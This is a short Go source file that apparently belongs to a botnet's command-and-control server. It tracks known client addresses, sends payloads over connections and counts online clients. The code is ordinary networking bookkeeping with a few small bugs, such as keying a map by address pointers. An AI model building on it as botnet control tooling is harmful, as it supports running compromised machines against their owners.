// This file handles client connections to the server

package net

import (
	. "botnet/server/util"
	"net"
	"strings"
)

var Connections map[net.Addr]*net.Conn // The value is nil if the client is not currently connected, but has connected before.

func getKnownAddresses() {
	knownAddressesRaw := ReadFile(KnownAddressesPath, true)
	knownAddresses := strings.Split(*knownAddressesRaw, "\n")
	
	for _, addressStr := range knownAddresses {
		if addressStr == "" { continue }
		addr, err := net.ResolveTCPAddr("tcp", addressStr)
		if err != nil {
			Error("Failed to resolve known address, %s", err.Error())
			return
		}

		Connections[addr] = nil
	}
}

func init() {
	Connections = make(map[net.Addr]*net.Conn)
	getKnownAddresses()
}

func Write(conn net.Conn, payload []byte) error {
	_, err := conn.Write(payload)	
	if err != nil {
		Connections[conn.LocalAddr()] = nil
	}

	return err
}

func OnlineConnectionCount() int {
	count := 0

	for _, conn := range Connections {
		if conn != nil {
			count += 1
		}
	}

	return count
}